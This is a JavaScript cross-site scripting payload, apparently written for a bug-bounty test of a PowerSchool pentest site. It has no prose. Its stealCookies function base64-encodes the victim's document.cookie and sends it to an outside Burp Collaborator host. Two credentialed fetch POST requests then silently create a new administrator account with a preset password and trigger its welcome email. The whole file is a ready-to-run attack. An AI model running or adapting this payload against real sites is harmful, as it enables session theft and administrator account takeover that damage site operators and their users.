alert(document.cookie);
alert(document.domain);
function stealCookies(){
  const url = 'https://kc0uextit85igfq9a8t1015ei5ovck.burpcollaborator.net/?cookies=' + btoa(document.cookie)
  const response = fetch(url)
}

function getCookie(cname)
{
  var name = cname + "=";
  var ca = document.cookie.split(';');
  for(var i=0; i<ca.length; i++) 
  {
    var c = ca[i].trim();
    if (c.indexOf(name)==0) return c.substring(name.length,c.length);
  }
  return "";
}
stealCookies();

// add new administrator account
fetch("https://pentest.sfe.powerschool.com/profileMainAction.do", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
    "cache-control": "no-cache",
    "content-type": "application/x-www-form-urlencoded",
    "pragma": "no-cache",
    "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"128\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1"
  },
  "referrer": "https://pentest.sfe.powerschool.com/profileMainNewInitAction.do",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "employeeSearchId=&accessIdStr=9998&webPassword=Password%211&lastName=Stone1&firstName=John1&email=esperamier%2B1%40bugcrowdninja.com&pin=999898&externalId=&customField1=&customField2=&customField3=&customField4=&customField5=&customField6=&customField7=&customField8=&phone1=02126909455&addressLn1=1870+Oakwood+Avenue&addressLn2=&city=New+York&state=NY&zip=100314&genderCd=0&ethnicityCd=0&languageId=1&roleAdm=on&calendarId=-99&disableJobShopping=false&callBackNumber=&submitInsert=Save",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});

// Send the welcome email
fetch("https://pentest.sfe.powerschool.com/profileMainAction.do", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
    "cache-control": "no-cache",
    "content-type": "application/x-www-form-urlencoded",
    "pragma": "no-cache",
    "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"128\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1"
  },
  "referrer": "https://pentest.sfe.powerschool.com/profileMainAction.do",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "employeeSearchId=9998&sendWelcomeEmail=Send+Welcome+Email&accessIdStr=9998&webPassword=Password%211&lastName=Stone1&firstName=John1&email=esperamier%2B1%40bugcrowdninja.com&pin=999898&externalId=&customField1=&customField2=&customField3=&customField4=&customField5=&customField6=&customField7=&customField8=&phone1=02126909455&addressLn1=1870+Oakwood+Avenue&addressLn2=&city=New+York&state=NY&zip=100314&genderCd=0&ethnicityCd=0&languageId=1&roleAdm=on&calendarId=1&disableJobShopping=false&callBackNumber=",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
